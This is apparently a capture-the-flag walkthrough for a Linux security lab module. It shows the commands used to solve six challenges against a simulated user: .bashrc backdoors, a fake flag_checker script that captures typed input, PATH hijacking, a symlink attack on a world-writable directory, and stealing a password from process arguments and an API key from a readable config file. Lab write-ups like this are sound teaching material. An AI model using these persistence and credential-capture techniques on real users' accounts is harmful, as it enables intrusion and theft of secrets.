# Silly Shenanigans
<p>This module will deepen your knowledge of Linux through some shenanigans.
Understanding how features of a system impact its security is a great way to understand its inner workings.</p>

---

## Bashrc Backdoor
To complete this challenge, you need to modify zardus's `.bashrc` file to execute a command that reads the flag and makes it accessible to you. Since zardus has read access to `/flag`, you can add a command to copy the flag to a world-writable directory like `/tmp`. After running the victim simulation script, you can retrieve the flag from the copied file.

### Steps to Get the Flag
1. **Append a command to zardus's `.bashrc`** that copies the flag to `/tmp`:
   ```bash
   echo 'cat /flag > /tmp/flag_copy' >> /home/zardus/.bashrc
   ```

2. **Run the victim simulation script** to trigger the execution of `.bashrc`:
   ```bash
   /challenge/victim
   ```

3. **Read the flag** from the copied file:
   ```bash
   cat /tmp/flag_copy
   ```

This will output the flag for the challenge. The command in `.bashrc` runs when zardus logs in (simulated by `/challenge/victim`), and the flag is written to `/tmp/flag_copy`, which you can access as the hacker user.

**Note:** If you encounter any issues, ensure that the command was correctly appended to `/home/zardus/.bashrc` and that the victim script runs without errors. You can also use `sudo su --login zardus` in Privileged Mode to test the behavior manually.

---

## Sniffing Input
To complete this challenge, you need to hijack the `flag_checker` command that Zardus runs by creating a fake version that captures the flag he types. Follow these steps:

### Steps to Get the Flag
1. **Create a directory for your fake commands**:
   ```bash
   mkdir -p /home/hacker/mybin
   ```

2. **Create a fake `flag_checker` script** that mimics the real prompt and captures the input:
   ```bash
   cat > /home/hacker/mybin/flag_checker << 'EOF'
   #!/bin/bash
   echo "Type the flag"
   read input
   echo "$input" > /tmp/flag_captured
   EOF
   ```

3. **Make the fake script executable**:
   ```bash
   chmod +x /home/hacker/mybin/flag_checker
   ```

4. **Modify Zardus's `.bashrc` to prepend your directory to his `PATH`**:
   ```bash
   echo 'export PATH="/home/hacker/mybin:$PATH"' >> /home/zardus/.bashrc
   ```

5. **Run the victim simulation script** to trigger Zardus's login and the execution of `flag_checker`:
   ```bash
   /challenge/victim
   ```

6. **Retrieve the captured flag** from `/tmp/flag_captured`:
   ```bash
   cat /tmp/flag_captured
   ```

This will output the flag that Zardus typed into the fake `flag_checker`. The fake script intercepts the input and saves it to a file accessible by you.

---

## Overshared Directories
To complete this challenge, you need to leverage write access to Zardus's home directory (`/home/zardus`) to hijack the `flag_checker` command. By replacing Zardus's `.bashrc` file and creating a fake `flag_checker` script, you can intercept the flag when Zardus runs the command. Follow these steps:

### Steps to Get the Flag
1. **Remove the existing `.bashrc` file** in Zardus's home directory (if it exists) to eliminate any existing configuration:
   ```bash
   rm /home/zardus/.bashrc
   ```

2. **Create a new `.bashrc` file** that adds a malicious directory to the beginning of Zardus's `PATH` environment variable:
   ```bash
   echo 'export PATH="/home/zardus/malicious:$PATH"' > /home/zardus/.bashrc
   ```

3. **Create the malicious directory** within Zardus's home directory:
   ```bash
   mkdir /home/zardus/malicious
   ```

4. **Create a fake `flag_checker` script** in the malicious directory. This script will mimic the real `flag_checker` by prompting for the flag and capturing the input:
   ```bash
   cat > /home/zardus/malicious/flag_checker << 'EOF'
   #!/bin/bash
   echo "Type the flag"
   read input
   echo "$input" > /tmp/flag_captured
   EOF
   ```

5. **Make the fake `flag_checker` script executable**:
   ```bash
   chmod +x /home/zardus/malicious/flag_checker
   ```

6. **Run the victim simulation script** to trigger Zardus's login and the execution of `flag_checker`:
   ```bash
   /challenge/victim
   ```

7. **Retrieve the captured flag** from the temporary file:
   ```bash
   cat /tmp/flag_captured
   ```

This approach works because when Zardus logs in, the new `.bashrc` file is executed, adding the malicious directory to his `PATH`. When he runs `flag_checker`, the fake version in the malicious directory is executed first, capturing the flag he types and saving it to `/tmp/flag_captured`, which you can read as the `hacker` user.

**Note:** If you encounter any issues, ensure that all commands are executed correctly and that the fake `flag_checker` script has the correct permissions. You can use `sudo su --login zardus` in Privileged Mode to test the setup if needed.

---

## Tricky Linking
To complete this challenge, you need to exploit the world-writable directory `/tmp/collab` by replacing the `evil-commands.txt` file with a symbolic link to Zardus's `.bashrc` file. This will cause Zardus to append the command `cat /flag` to his `.bashrc` when he runs the `/challenge/victim` script. When Zardus logs in again during a second run of `/challenge/victim`, the `.bashrc` file will be executed, outputting the flag. Here are the steps:

### Steps to Get the Flag
1. **Remove the existing `evil-commands.txt` file** in `/tmp/collab` (if it exists) to avoid conflicts:
   ```bash
   rm -f /tmp/collab/evil-commands.txt
   ```

2. **Create a symbolic link** from `/tmp/collab/evil-commands.txt` to `/home/zardus/.bashrc`:
   ```bash
   ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
   ```

3. **Run `/challenge/victim` for the first time**. This will simulate Zardus logging in and appending `cat /flag` to `/tmp/collab/evil-commands.txt`, which actually appends it to `/home/zardus/.bashrc`:
   ```bash
   /challenge/victim
   ```
   During this run, you will see Zardus's login session, but no flag will be displayed yet. After he exits, the command will be appended to `.bashrc`.

4. **Run `/challenge/victim` for the second time**. This time, when Zardus logs in, his `.bashrc` file will be executed, running `cat /flag` and outputting the flag before the shell prompt:
   ```bash
   /challenge/victim
   ```
   The flag will be displayed in the output during the login process.

### Note:
- Ensure that the symbolic link is created correctly and that `/home/zardus/.bashrc` is writable via the link.
- If the flag does not appear, verify that the append operation occurred by checking `/home/zardus/.bashrc` (if accessible) or run the steps again.

This attack works because of the world-writable directory without the sticky bit, allowing you to manipulate files that Zardus writes to, ultimately leading to command execution in his shell startup file.

---

## Sniffing Process Arguments
To complete this challenge, you need to steal Zardus's password from a process argument using the `ps` command, then use that password to switch to the Zardus user and read the flag with `sudo`. Here's how:

### Steps to Get the Flag
1. **Find Zardus's process and extract the password**:
   - Run `ps aux | grep zardus` to list all processes owned by Zardus. Look for the command that includes the password as an argument. You might need to use `ps auxww` to see the full command without truncation.
   - Example output:
     ```
     zardus   1234  0.0  0.0  12345  6789 pts/0    S+   10:00   0:00 /usr/bin/automation_script --password mysecretpassword
     ```
     In this case, the password is `mysecretpassword`.

2. **Switch to the Zardus user**:
   - Use `su zardus` and enter the password when prompted:
     ```bash
     su zardus
     ```
     Password: `mysecretpassword`

3. **Read the flag using sudo**:
   - Since Zardus has sudo privileges, run:
     ```bash
     sudo cat /flag
     ```
     This will output the flag.

### Note:
- If you don't see the password immediately, try `ps aux | grep -v grep | grep zardus` to filter out the grep process itself.
- Ensure you type the password correctly when using `su`.

By following these steps, you will retrieve the flag from the system.

---

## Snooping on Configurations
To complete this challenge, you need to retrieve the API key from Zardus's world-readable `.bashrc` file and use it with the `flag_getter` command to obtain the flag. Here's how:

### Steps to Get the Flag
1. **Read Zardus's `.bashrc` file** to find the API key:
   ```bash
   cat /home/zardus/.bashrc
   ```
   This will output the contents of the file, which should include a line like `FLAG_GETTER_API_KEY=sk-XXXYYYZZZ`. Note the API key value (e.g., `sk-XXXYYYZZZ`).

2. **Use the API key with the `flag_getter` command**:
   ```bash
   flag_getter --key sk-XXXYYYZZZ
   ```
   Replace `sk-XXXYYYZZZ` with the actual API key you found.

3. **When prompted**, confirm that you want to print the key by typing `y` and pressing Enter. The command will then output the flag.

### Example:
If the `.bashrc` file contains:
```bash
FLAG_GETTER_API_KEY=sk-abc123
```
Then run:
```bash
flag_getter --key sk-abc123
```
And answer `y` to the prompt to get the flag.

This works because Zardus's `.bashrc` is world-readable, allowing you to access the sensitive API key stored in it.
